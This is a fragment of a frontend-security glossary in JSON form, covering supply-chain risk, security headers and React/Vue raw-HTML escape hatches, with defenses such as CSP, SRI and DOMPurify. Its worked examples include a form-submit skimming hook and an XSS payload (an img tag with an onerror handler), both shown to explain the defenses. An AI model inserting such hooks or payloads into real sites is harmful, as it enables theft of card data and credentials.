  "supply-chain": {"term":"Frontend Supply-Chain Risk","group":"FE-SEC","eli5":"Every dependency and third-party script you load can run code in your app, so a compromised one is a compromise of you.","memory":"\"Your bundle is as trustworthy as its least-trustworthy dependency.\" Contain with CSP + least privilege.","full":"<p>A modern frontend's attack surface includes all transitive npm dependencies and every runtime third-party tag. A <strong>malicious/hijacked package</strong> (typosquat, compromised maintainer, post-install script) runs with build privileges; a <strong>compromised third-party script</strong> runs in your origin with full DOM/cookie access (the Magecart skimming pattern).</p><p>Reduce risk with committed lockfiles, version pinning, <code>npm ci</code> integrity checks, dependency-diff review, disabling install scripts where feasible, SCA tooling and SBOMs, <strong>SRI</strong> on CDN assets (enforced via <code>Integrity-Policy</code>), and a <strong>strict CSP</strong> (incl. <code>connect-src</code>/<code>frame-ancestors</code>) to contain blast radius. Minimize dependency count.</p>","trap":"Trusting the registry and 'popular = safe.' Popular packages get hijacked precisely because they're high-leverage; assume any dep can turn hostile.","worked":"A hijacked analytics tag adds <code>document.forms[0].addEventListener('submit', exfil)</code> to skim card data. A strict <code>connect-src</code> CSP blocks the exfil endpoint; SRI would have blocked an altered file.","related":["sri","csp","prototype-pollution","security-headers"]},
  "security-headers": {"term":"Security Response Headers","group":"FE-SEC","eli5":"A set of HTTP headers you send on every response that harden the browser's behavior for free.","memory":"\"CSP, HSTS, nosniff, frame-ancestors, Referrer-Policy\" — the default kit.","full":"<p>Core hardening headers a senior ships by default: <strong>CSP</strong> (XSS/clickjacking defense-in-depth), <strong>HSTS</strong> (<code>Strict-Transport-Security</code>, forces HTTPS, defeats SSL-strip), <strong><code>X-Content-Type-Options: nosniff</code></strong> (blocks MIME-sniffing that can turn data into executable script), <strong><code>Referrer-Policy</code></strong> (e.g. <code>strict-origin-when-cross-origin</code>, avoids leaking full URLs/tokens), and <strong><code>Permissions-Policy</code></strong> (disable unused powerful features).</p><p><code>frame-ancestors</code> in CSP supersedes the legacy <code>X-Frame-Options</code> (still set for old clients). <code>X-XSS-Protection</code> is deprecated (the XSS Auditor was removed from Chrome in 2019) — omit or set <code>0</code>. Set all of these as real HTTP response headers at the server/edge, not in markup.</p>","trap":"Setting headers in a <meta> tag. Most security headers (HSTS, XFO, nosniff) are ignored as meta tags — they must be real HTTP response headers.","worked":"<code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</code> — after the first HTTPS visit, the browser refuses to ever talk to the site over HTTP, blocking downgrade attacks.","related":["csp","clickjacking","cors","sri"]},
  "dangerously-set-inner-html": {"term":"dangerouslySetInnerHTML / v-html","group":"FE-SEC","eli5":"The framework escape hatch that injects raw HTML — bypassing the auto-escaping that normally protects you.","memory":"\"Named 'dangerously' for a reason — sanitize before you reach it.\"","full":"<p>Frameworks auto-escape interpolated text, so XSS in them almost always enters through an explicit raw-HTML escape hatch: React's <code>dangerouslySetInnerHTML</code>, Vue's <code>v-html</code>, Angular's <code>[innerHTML]</code> with <code>bypassSecurityTrustHtml</code>. React's <code>dangerouslySetInnerHTML</code> and Vue's <code>v-html</code> perform <strong>zero sanitization</strong>; Angular's <code>[innerHTML]</code> does run a built-in sanitizer unless you bypass it.</p><p>Use them only for genuine rich-markup needs and always pass <code>DOMPurify.sanitize(...)</code> output, sanitizing as close to render as possible. Layer <strong>Trusted Types</strong> so the platform enforces that only a vetted policy can produce HTML reaching these sinks.</p>","trap":"Assuming the framework still protects you here. For React/Vue the whole point of the escape hatch is that auto-escaping is OFF — you own sanitization completely.","worked":"<code>&lt;div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(comment)}} /&gt;</code>. Without the sanitize call, <code>comment = '&lt;img src=x onerror=steal()&gt;'</code> executes.","related":["xss","dom-purify","trusted-types","csp"]}
});
